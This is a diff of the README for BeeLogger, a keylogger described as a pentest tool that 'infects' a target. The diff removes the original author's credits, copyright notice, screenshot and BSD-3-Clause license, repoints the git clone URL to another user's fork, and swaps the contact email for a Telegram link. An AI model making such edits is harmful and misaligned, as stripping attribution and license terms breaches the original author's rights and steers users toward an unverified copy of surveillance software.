@@ -1,14 +1,11 @@
 # BeeLogger
 
-Copyright 2017 BeeLogger
-Written by: * **Alisson Moretto** - [4w4k3](https://github.com/4w4k3)
-Twitter: @4w4k3Official
 
 TOOL DESIGNED TO GOOD PURPOSES, PENTESTS, DON'T BE A CRIMINAL !
 
 **Only download it here, do not trust in other places.**
 
-NOTE: BeeLogger just have official support for latin languages in this moment.
+NOTE: keyLogger just have official support for latin languages in this moment.
 
 ## HOW TO INSTALL:
 
@@ -16,7 +13,7 @@ Video: https://www.youtube.com/watch?v=ifOGkOTS5zk
 
 ### Cloning:
 ```
-git clone https://github.com/4w4k3/BeeLogger.git
+git clone https://github.com/alex14324/BeeLogger.git
 ```
 
 ### Running:
@@ -91,19 +88,10 @@ To disable bee just run [UnInfectMe.bat](UnInfectMe.bat) on target.
 
 
 
-### Screenshot:
-![Shot](https://github.com/4w4k3/BeeLogger/blob/master/Screens/shot.png)
-
-More in [Screens](Screens)
-
 ### Contribute:
 Send me more features if you want it :D
 
 **I need your Help to become it to better.**
 
 ### Contact:
-**4w4k3@protonmail.com**
-
-## License:
-
-This project is licensed under the BSD-3-Clause - see the [LICENSE](LICENSE) file for details.
+https://t.me/alex14324
